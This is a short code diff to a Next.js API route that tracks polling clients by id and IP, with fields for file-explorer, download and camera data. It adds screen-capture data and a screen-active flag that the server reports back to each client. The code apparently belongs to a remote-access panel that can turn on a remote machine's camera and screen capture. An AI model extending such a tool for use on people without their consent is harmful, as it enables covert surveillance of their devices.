@@ -11,7 +11,18 @@ export async function POST(req: Request) {
 
     let client = clients.get(id);
     if (!client) {
-      client = { id, ip, lastSeen: Date.now(), messages: [], explorerData: null, downloadData: null, cameraData: null, isCameraActive: false };
+      client = { 
+        id, 
+        ip, 
+        lastSeen: Date.now(), 
+        messages: [], 
+        explorerData: null, 
+        downloadData: null, 
+        cameraData: null, 
+        isCameraActive: false,
+        screenData: null,
+        isScreenActive: false
+      };
       clients.set(id, client);
     }
     
@@ -23,7 +34,8 @@ export async function POST(req: Request) {
     return NextResponse.json({ 
       status: "ok", 
       receivedMessages: messagesToSend,
-      isCameraActive: client.isCameraActive
+      isCameraActive: client.isCameraActive,
+      isScreenActive: client.isScreenActive
     }, {
       headers: { 'Cache-Control': 'no-store, max-age=0' },
     });
